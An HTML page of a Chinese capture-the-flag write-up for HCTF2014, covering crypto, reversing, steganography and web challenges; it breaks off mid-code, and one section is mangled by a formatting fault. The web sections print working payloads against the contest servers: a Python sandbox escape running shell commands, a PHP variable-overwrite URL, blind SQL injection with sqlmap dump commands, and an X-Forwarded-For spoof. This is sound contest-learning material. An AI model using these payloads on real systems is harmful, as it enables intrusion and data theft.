@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Team：0xFA 这次和学弟学妹一起也是蛮拼的，希望能带起你们的激情，好好努力！ 总结不足，弥补不足，继续加油吧～ 丘比龙的最爱（10pt）丘比龙吃什么吃胖了飞不起来？ 甜甜圈 flag：甜甜圈 Entry（200pt）题目给了串字符： 57r9s980rnos49973s757pqo9s80q36p 根据题目描述中的 13，想到了 rot-13，直接秒了： 57e9f980eabf49973f">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HCTF2014 Writeup">
+<meta property="og:url" content="http://rickgray.me/2014/11/10/hctf2014-writeup/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="Team：0xFA 这次和学弟学妹一起也是蛮拼的，希望能带起你们的激情，好好努力！ 总结不足，弥补不足，继续加油吧～ 丘比龙的最爱（10pt）丘比龙吃什么吃胖了飞不起来？ 甜甜圈 flag：甜甜圈 Entry（200pt）题目给了串字符： 57r9s980rnos49973s757pqo9s80q36p 根据题目描述中的 13，想到了 rot-13，直接秒了： 57e9f980eabf49973f">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/ctfs//hctf2014/NormalFile_img_1.jpeg">
+<meta property="og:image" content="http://rickgray.me/images/ctfs//hctf2014/NormalFile_img_2.jpeg">
+<meta property="og:image" content="http://rickgray.me/images/ctfs//hctf2014/NormalFile_img_3.jpeg">
+<meta property="og:image" content="http://rickgray.me/images/ctfs//hctf2014/NormalFile_img_4.jpeg">
+<meta property="og:image" content="http://rickgray.me/images/ctfs//hctf2014/NormalFile_img_5.jpeg">
+<meta property="og:image" content="http://rickgray.me/images/ctfs//hctf2014/NormalFile_img_6.jpeg">
+<meta property="og:image" content="http://rickgray.me/images/ctfs//hctf2014/NormalFile_img_6.jpeg">
+<meta property="og:image" content="http://rickgray.me/images/ctfs//hctf2014/wow_img_2.jpeg">
+<meta property="og:updated_time" content="2018-04-24T15:44:25.449Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HCTF2014 Writeup">
+<meta name="twitter:description" content="Team：0xFA 这次和学弟学妹一起也是蛮拼的，希望能带起你们的激情，好好努力！ 总结不足，弥补不足，继续加油吧～ 丘比龙的最爱（10pt）丘比龙吃什么吃胖了飞不起来？ 甜甜圈 flag：甜甜圈 Entry（200pt）题目给了串字符： 57r9s980rnos49973s757pqo9s80q36p 根据题目描述中的 13，想到了 rot-13，直接秒了： 57e9f980eabf49973f">
+<meta name="twitter:image" content="http://rickgray.me/images/ctfs//hctf2014/NormalFile_img_1.jpeg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>HCTF2014 Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2014/11/16/error-based-sql-injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2014/08/26/bypass-dep-with-rop-study/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2014/11/10/hctf2014-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&text=HCTF2014 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&is_video=false&description=HCTF2014 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HCTF2014 Writeup&body=Check out this article: http://rickgray.me/2014/11/10/hctf2014-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&title=HCTF2014 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2014/11/10/hctf2014-writeup/&name=HCTF2014 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Team：0xFA"><span class="toc-number">1.</span> <span class="toc-text">Team：0xFA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#丘比龙的最爱（10pt）"><span class="toc-number"></span> <span class="toc-text">丘比龙的最爱（10pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Entry（200pt）"><span class="toc-number"></span> <span class="toc-text">Entry（200pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyCrack（100pt）"><span class="toc-number"></span> <span class="toc-text">babyCrack（100pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyCrack2（100pt）"><span class="toc-number"></span> <span class="toc-text">babyCrack2（100pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nvshen（100pt）"><span class="toc-number"></span> <span class="toc-text">nvshen（100pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IRC（300pt）"><span class="toc-number"></span> <span class="toc-text">IRC（300pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FIND（200pt）"><span class="toc-number"></span> <span class="toc-text">FIND（200pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#starbucks（400pt）"><span class="toc-number"></span> <span class="toc-text">starbucks（400pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jianshu（400pt）"><span class="toc-number"></span> <span class="toc-text">jianshu（400pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#opensource（300pt）"><span class="toc-number"></span> <span class="toc-text">opensource（300pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOCK（300pt）"><span class="toc-number"></span> <span class="toc-text">LOCK（300pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NormalFile（300pt）"><span class="toc-number"></span> <span class="toc-text">NormalFile（300pt）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wow（400pt）"><span class="toc-number"></span> <span class="toc-text">wow（400pt）</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HCTF2014 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2014-11-09T16:00:00.000Z" itemprop="datePublished">2014-11-10</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/writeup/">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="Team：0xFA"><a href="#Team：0xFA" class="headerlink" title="Team：0xFA"></a>Team：0xFA</h3><hr>
+<p>这次和学弟学妹一起也是蛮拼的，希望能带起你们的激情，好好努力！</p>
+<p>总结不足，弥补不足，继续加油吧～</p>
+<h2 id="丘比龙的最爱（10pt）"><a href="#丘比龙的最爱（10pt）" class="headerlink" title="丘比龙的最爱（10pt）"></a>丘比龙的最爱（10pt）</h2><p>丘比龙吃什么吃胖了飞不起来？</p>
+<pre><code>甜甜圈
+</code></pre><p>flag：<code>甜甜圈</code></p>
+<h2 id="Entry（200pt）"><a href="#Entry（200pt）" class="headerlink" title="Entry（200pt）"></a>Entry（200pt）</h2><p>题目给了串字符：</p>
+<pre><code>57r9s980rnos49973s757pqo9s80q36p
+</code></pre><p>根据题目描述中的 <code>13</code>，想到了 rot-13，直接秒了：</p>
+<pre><code>57e9f980eabf49973f757cdb9f80d36c --&gt; md5(Qoobee)
+</code></pre><p>flag：<code>Qoobee</code></p>
+<h2 id="babyCrack（100pt）"><a href="#babyCrack（100pt）" class="headerlink" title="babyCrack（100pt）"></a>babyCrack（100pt）</h2><p>.net的，直接反编译：</p>
+<pre><code>private void button1_Click(object sender, EventArgs e)
+{
+    bool flag = false;
+    Config.user = this.textBox1.Text;
+    string user = Config.user;
+    string str2 = &quot;hctf{bABy_CtsvlmE_!}&quot;;
+    if (str2.CompareTo(user) == 0)
+    {
+        flag = true;
+    }
+    if (flag)
+    {
+        MessageBox.Show(&quot;good !!!&quot;);
+    }
+}
+</code></pre><p>flag：<code>hctf{bABy_CtsvlmE_!}</code></p>
+<h2 id="babyCrack2（100pt）"><a href="#babyCrack2（100pt）" class="headerlink" title="babyCrack2（100pt）"></a>babyCrack2（100pt）</h2><p>题目给了个可执行文件：</p>
+<pre><code>~ ⮀ file babyCrack2.exe
+babyCrack2.exe: PE32 executable for MS Windows (console) Intel 80386 32-bit
+</code></pre><p>直接拖到IDA里，翻一翻就可以看到flag（话说程序逻辑是不是有问题？）：</p>
+<pre><code>.text:00401010                 push    ebp
+.text:00401011                 mov     ebp, esp
+.text:00401013                 sub     esp, 0E4h
+.text:00401019                 push    ebx
+.text:0040101A                 push    esi
+.text:0040101B                 push    edi
+.text:0040101C                 lea     edi, [ebp+var_E4]
+.text:00401022                 mov     ecx, 39h
+.text:00401027                 mov     eax, 0CCCCCCCCh
+.text:0040102C                 rep stosd
+.text:0040102E                 mov     [ebp+var_20], offset aIdug35utCcbzDu ; &quot;idug|3`5ut`CCbZ`DusnF`34~&quot;
+.text:00401035                 cmp     [ebp+arg_0], 1
+.text:00401039                 jnz     short loc_40104F
+.text:0040103B                 push    offset aTryAgain1 ; &quot;try again1!!!\n&quot;
+.text:00401040                 call    sub_40117C
+.text:00401045                 add     esp, 4
+.text:00401048                 push    0               ; int
+.text:0040104A                 call    _exit
+</code></pre><p>flag：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## GIFT（100pt）</span><br><span class="line"></span><br><span class="line">打开题目，查看源码发现了这句话：As thanks, we provide gifts(flag) -index.php.bak  for you.</span><br><span class="line"></span><br><span class="line">于是打开index.php.bak,整理后如下</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">    $flag=&apos;xxx&apos;;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    if(isset($gift))&#123;</span><br><span class="line">    $content=trim(file_get_contents($flag));</span><br><span class="line">    if($gift==$content)&#123;</span><br><span class="line">        echo&apos;hctf&#123;...&#125;&apos;;&#125;</span><br><span class="line">    else&#123;echo&apos;Oh..&apos;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>看到extract($_GET)，很明显的变量覆盖漏洞，于是我们可以控制$flag和$gift，满足$gift==$content即能拿到flag。我们已知index.php.bak的内容，于是让$flag为index.php.bak的内容，$gift为index.php.bak即可。</p>
+<p>构造url:</p>
+<pre><code>http://121.40.86.166:39099/index.php?gift=&lt;?php$flag=&apos;xxx&apos;;extract($_GET);if(isset($gift)){$content=trim(file_get_contents($flag));if($gift==$content){echo&apos;hctf{...}&apos;;}else{echo&apos;Oh..&apos;;}}?&gt;&amp;flag=index.php.bak
+</code></pre><p>得到flag：<code>hctf{Awe3ome_Ex7ract!!!}</code></p>
+<h2 id="nvshen（100pt）"><a href="#nvshen（100pt）" class="headerlink" title="nvshen（100pt）"></a>nvshen（100pt）</h2><p>题目给了个base64编码后的图片：</p>
+<pre><code>iVBORw0KGgoAAAANSUhEUgAAAdIAAAGUCAYAAACBYaNHAAAKQWlDQ1BJQ0MgUHJvZmlsZQAASA2dlndUU9kWh8+9N73QEiIgJfQaegkg0jtIFQRRiUmAUAKGhCZ2RAVGFBEpVmRUwAFHhyJjRRQLg4Ji1wnyEFDGwVFEReXdjGsJ7601896a/cdZ39nnt9fZZ+9917oAUPyCBMJ0WAGANKFYFO7rwVwSE8vE9wIYEAEOWAHA4WZmBEf4RALU/L09mZmoSMaz9u4ugGS72yy/UCZz1v9/kSI3QyQGAApF1TY8fiYX5QKUU7PFGTL/BMr0lSkyhjEyFqEJoqwi48SvbPan5iu7yZiXJuShGlnOGbw0noy7U......（太长省略）
+</code></pre><p>解码成png图片：</p>
+<p>linux命令：</p>
+<pre><code>~ ⮀ cat nvshen.txt | base64 --decode &gt; nvshen.png
+</code></pre><p>url伪协议：</p>
+<pre><code>data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAdIAAAGUCAYAAACBYaNHAAAKQWlDQ1BJQ0MgUHJvZmlsZQAASA2dlndUU9kWh8+9N73QEiIgJfQaegkg0jtIFQRRiUmAUAKGhCZ2RAVGFBEpVmRUwAFHhyJjRRQLg4Ji1wnyEFDGwVFEReXdjGsJ7601896a/cdZ39nnt9fZZ+9917oAUPyCBMJ0WAGANKFYFO7rwVwSE8vE9wIYEAEOWAHA4WZmBEf4RALU/L09mZmoSMaz9u4ugGS72yy/UCZz1v9/kSI3QyQGAApF1TY8fiYX5QKUU7PFGTL/BMr0lSkyhjEyFqEJoqwi48SvbPan5iu7yZiXJuShGlnOGbw0noy7U......（太长省略）
+</code></pre><p>得到一张女神图片（表示真不知道是谁，百度一下以为是柳岩，结果错了）。</p>
+<p>flag：<code>爱新觉罗启星</code></p>
+<h2 id="IRC（300pt）"><a href="#IRC（300pt）" class="headerlink" title="IRC（300pt）"></a>IRC（300pt）</h2><p>这题略坑，到官方IRC里找flag（有故意刷人气的嫌疑），经过一阵折腾之后通过whois查询每一个房间里的人，最终在 <code>klroot</code> 用户的whois信息中找到了flag。</p>
+<p>flag：<code>hctf{ZXwz_ym_dinDIM_daDi_!}</code></p>
+<p>##FuckMe（350pt）</p>
+<p>把洋字符看成是字母替换后的对应的密文就行，此题可根据词频来计算。也可根据flag的格式来找到入手点 <code>hctf{xxx}</code>，在文中找到 <code>おいひд{ёгфすχχすζшのёけдэгおいひд}</code>，得到如下对应关系：</p>
+<pre><code>お ==&gt; h
+い ==&gt; c
+ひ ==&gt; t
+д ==&gt; f
+</code></pre><p>将此4个替换原密文，然后根据敏锐的洞察力和扎实的英文基础得到25个字母（’z’未出现）的对应关系：</p>
+<pre><code>я ==&gt; a  ю ==&gt; b  い ==&gt; c  う ==&gt; d
+ё ==&gt; e  д ==&gt; f  え ==&gt; g  お ==&gt; h
+э ==&gt; i  ф ==&gt; j  я ==&gt; k  け ==&gt; l  
+ы ==&gt; m  г ==&gt; n  す ==&gt; o  せ ==&gt; p  
+ж ==&gt; q  ш ==&gt; r  の ==&gt; s  ひ ==&gt; t  
+ζ ==&gt; u  θ ==&gt; v  ξ ==&gt; w  π ==&gt; x  
+χ ==&gt; y  ? ==&gt; z
+</code></pre><p>解密整篇文章：</p>
+<pre><code>in cryptanalysis, frequency analysis is the study of the frequency of letters or groups of letters in a ciphertext. the method is used as an aid to breaking classical ciphers.
+
+...
+
+the first known recorded explanation of frequency analysis (indeed, of any kind of cryptanalysis) was given in the 9th century by al-kindi, an arab polymath, in a manuscript on deciphering cryptographic messages.[3] it has been suggested that close textual study of the qur&apos;an first brought to light that arabic has a hctf{enjoyyourselfinhctf}.characteristic letter frequency.[4] its use spread, and similar systems were widely used in european states by the time of the renaissance. by 1474, cicco simonetta had written a manual on deciphering encryptions of latin and italian text.[5] arabic letter frequency and a detailed study of letter and word frequency analysis of the entire book of qur&apos;an are provided by intellaren articles.
+
+...
+</code></pre><p>flag：<code>hctf{enjoyyourselfinhctf}</code></p>
+<h2 id="FIND（200pt）"><a href="#FIND（200pt）" class="headerlink" title="FIND（200pt）"></a>FIND（200pt）</h2><p>题目给了张比较大的图片，提示给了是隐写，直接掏出神器 <code>Stegsolve.jar</code>。</p>
+<p>在该图片的其它色度上隐藏了一张二维码，微信扫一扫即可得到flag。</p>
+<p>flag：<code>flag{hctf_3xF$235#\x5e3}</code></p>
+<h2 id="starbucks（400pt）"><a href="#starbucks（400pt）" class="headerlink" title="starbucks（400pt）"></a>starbucks（400pt）</h2><p>tips：nc 115.29.191.81 15878</p>
+<pre><code>~ ⮀ nc 115.29.191.81 15878
+Python 2.7.6 (default, Mar 22 2014, 22:59:56)
+[GCC 4.8.2] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+(InteractiveConsole)
+</code></pre><p>nc上去一看是python里code模块的一个交互式解释器，但是测试一番后发现删除了某些symbol，并且在交互下没有输出，只有在正常exit()时候才会返回交互输出。</p>
+<p>网上搜索了一下发现了与该题类似的一个Paper：</p>
+<p><a href="https://github.com/PyCodersCN/PyCodersCN/blob/3328d1ed08d33232e1eca0d92f679508f002c809/issue17/eval-really-is-dangerous.rst" target="_blank" rel="noopener">https://github.com/PyCodersCN/PyCodersCN/blob/3328d1ed08d33232e1eca0d92f679508f002c809/issue17/eval-really-is-dangerous.rst</a></p>
+<p>同时在google上又发现了picoctf上的一道题目与此类似（为何又是这样）：</p>
+<p><a href="http://jonathanzong.com/picoctf/2013/05/07/python-eval-5-140" target="_blank" rel="noopener">http://jonathanzong.com/picoctf/2013/05/07/python-eval-5-140</a></p>
+<p>直接根据文章中的POC即可执行命令：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'catch_warnings'</span>][<span class="number">0</span>].__init__.func_globals[<span class="string">"linecache"</span>].__dict__[<span class="string">"os"</span>].system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+<p>经过一番搜索后，发现flag的路径为：<code>/home/starbucks/grande/greentea/latte/flag</code></p>
+<pre><code>~ ⮀ nc 115.29.191.81 15878
+Python 2.7.6 (default, Mar 22 2014, 22:59:56)
+[GCC 4.8.2] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+(InteractiveConsole)
+[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==     &apos;catch_warnings&apos;][0].__init__.func_globals[&quot;linecache&quot;].__dict__[&quot;os&quot;].system(&apos;find /home -name flag&apos;);exit()
+/home/starbucks/grande/greentea/latte/flag
+&gt;&gt;&gt; 0
+</code></pre><p>然后读取flag的内容：</p>
+<pre><code>~ ⮀ nc 115.29.191.81 15878
+Python 2.7.6 (default, Mar 22 2014, 22:59:56)
+[GCC 4.8.2] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+(InteractiveConsole)
+[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == &apos;catch_warnings&apos;][0].__init__.func_globals[&quot;linecache&quot;].__dict__[&quot;os&quot;].system(&apos;cat /home/starbucks/grande/greentea/latte/flag&apos;);exit()
+hctf{J_do_mo_xyz_!_123_HAHA_lee}
+&gt;&gt;&gt; 0
+</code></pre><p>PS：这里也能读取程序本身代码（/home/starbucks/starbucks.py）：</p>
+<pre><code> ~ ⮀ nc 115.29.191.81 15878
+Python 2.7.6 (default, Mar 22 2014, 22:59:56)
+[GCC 4.8.2] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+(InteractiveConsole)
+().__class__.__bases__[0].__subclasses__()[40](&apos;/home/starbucks/starbucks.py&apos;).read();exit()
+&gt;&gt;&gt; &quot;#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom code import InteractiveConsole\n\nvars = globals().copy()\nvars.update(locals())\nshell = InteractiveConsole(vars)\n# shell.interact()\n\n# rm unsafe\ndef make_safe():\n    UNSAFE = [&apos;open&apos;,\n              &apos;file&apos;,\n              &apos;execfile&apos;,\n              #&apos;compile&apos;,\n              &apos;reload&apos;,\n              &apos;__import__&apos;,\n              &apos;eval&apos;,\n              &apos;input&apos;]\n    for func in UNSAFE:\n        del __builtins__.__dict__[func]\n\ndel vars\nmake_safe()\n\nshell.interact()\n&quot;
+</code></pre><p><strong>starbucks.py</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> code <span class="keyword">import</span> InteractiveConsole</span><br><span class="line">vars = globals().copy()</span><br><span class="line">vars.update(locals())</span><br><span class="line">shell = InteractiveConsole(vars)</span><br><span class="line"><span class="comment"># shell.interact()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rm unsafe</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_safe</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,</span><br><span class="line">              <span class="string">'file'</span>,</span><br><span class="line">              <span class="string">'execfile'</span>,</span><br><span class="line">             <span class="comment">#'compile',</span></span><br><span class="line">              <span class="string">'reload'</span>,</span><br><span class="line">              <span class="string">'__import__'</span>,</span><br><span class="line">              <span class="string">'eval'</span>,</span><br><span class="line">              <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> vars</span><br><span class="line">make_safe()</span><br><span class="line">shell.interact()</span><br></pre></td></tr></table></figure>
+<p>flag：<code>hctf{J_do_mo_xyz_!_123_HAHA_lee}</code></p>
+<h2 id="jianshu（400pt）"><a href="#jianshu（400pt）" class="headerlink" title="jianshu（400pt）"></a>jianshu（400pt）</h2><p>这题比较坑，一开始陷入了出题者xss的奇淫贱术中，通过xss拿到了提交content查看的url <code>http://121.41.37.11:25045/get.php?user=V1ew</code> 和 合法访问的ip地址：<code>218.75.123.186</code></p>
+<p>期间访问 <code>http://121.41.37.11:25045/get.php?user=</code> 时提示在数据库中的log去找 <code>user</code> 所对应的可选值。</p>
+<p>后来发现根目录下有张图片 <code>2.jpg</code>，内容是 <code>sqlmap</code> 的介绍，然后开始寻找注入点，在 <code>http://121.41.37.11:25045/img.php?file=1.jpg</code> 这里发现了猫腻，此处存在盲注：</p>
+<pre><code>http://121.41.37.11:25045/img.php?file=&apos; or if((32=32),sleep(10),2)%231.jpg
+</code></pre><p>然后直接丢进sqlmap开始跑：</p>
+<pre><code>sqlmap -v 3 --technique=T -u &quot;http://121.41.37.11:25045/img.php?file=*%231.jpg&quot; --level=5 --threads=10 --dbs
+</code></pre><p>跑出3个库：</p>
+<pre><code>available databases [3]:
+[*] information_schema
+[*] t2_db
+[*] test
+</code></pre><p><code>information_schema</code> 和 <code>test</code> 都没什么好看的，直接跑 <code>t2_db</code> 的表：</p>
+<pre><code>sqlmap -v 3 --technique=T -u &quot;http://121.41.37.11:25045/img.php?file=*%231.jpg&quot; --level=5 --threads=10 -D t2_db --tables
+</code></pre><p>得到3张表：</p>
+<pre><code>Database: t2_db
+[3 tables]
++---------+
+| content |
+| file    |
+| log     |
++---------+
+</code></pre><p>tips叫我们去看log的信息，就直接跑log的字段吧：</p>
+<pre><code>sqlmap -v 3 --technique=T -u &quot;http://121.41.37.11:25045/img.php?file=*%231.jpg&quot; --level=5 --threads=10 -D t2_db -T log --columns
+</code></pre><p>结果显示只有2个字段：</p>
+<pre><code>Database: t2_db
+Table: log
+[2 columns]
++--------+------+
+| Column | Type |
++--------+------+
+| param  | text |
+| type   | text |
++--------+------+
+</code></pre><p>然后开始dump <code>log</code> 表的数据：</p>
+<pre><code>sqlmap -v 3 --technique=T -u &quot;http://121.41.37.11:25045/img.php?file=*%231.jpg&quot; --level=5 --threads=10 -D t2_db -T log -C param,type --dump
+</code></pre><p>得到我们所需的数据：</p>
+<pre><code>Database: t2_db
+Table: log
+[3 entries]
++-------+----------+
+| param | type     |
++-------+----------+
+| user  | A1rB4s1C |
+| user  | guest    |
+| user  | V1ew     |
++-------+----------+
+</code></pre><p>然后修改 <code>X-Forwarded-For</code> 来让自己ip变为程序认为是合法的地址（218.75.123.186）去访问如下url：</p>
+<pre><code>http://121.41.37.11:25045/get.php?user=A1rB4s1C
+</code></pre><p>flag：<code>hctf{Why_are_U_S0_DIA0?????}</code></p>
+<h2 id="opensource（300pt）"><a href="#opensource（300pt）" class="headerlink" title="opensource（300pt）"></a>opensource（300pt）</h2><p>一开始各种google，baidu源码，发现了有 <code>.git</code> 目录。后来队友发现wooyun上有个案例：<a href="http://wooyun.org/bugs/wooyun-2010-076372" target="_blank" rel="noopener">友盟网git服务使用不当导致源代码泄露</a></p>
+<p>根据这个案例提供的方法把 <code>art-cli</code> 的源码down到本地进行审计。</p>
+<p>然后在 <code>/app.js</code> 中发现了另一个根目录：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">app.use(favicon());</span><br><span class="line">app.use(logger(<span class="string">'dev'</span>));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line">app.use(bodyParser.urlencoded());</span><br><span class="line">app.use(cookieParser());</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/'</span>, routes);</span><br><span class="line">app.use(<span class="string">'/ac6555bfe23f5fe7e98fdcc0cd5f2451'</span>, pangci);</span><br><span class="line"></span><br><span class="line"><span class="comment">/// catch 404 and forwarding to error handler</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>然后看程序对 <code>/ac6555bfe23f5fe7e98fdcc0cd5f2451</code> 路径的处理函数，对应文件 <code>/routes/pangci.js</code>：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data = path.normalize(<span class="string">'/tmp/flag'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.param(<span class="string">'pangci'</span>)) &#123;</span><br><span class="line">    cp.exec(secure(req.param(<span 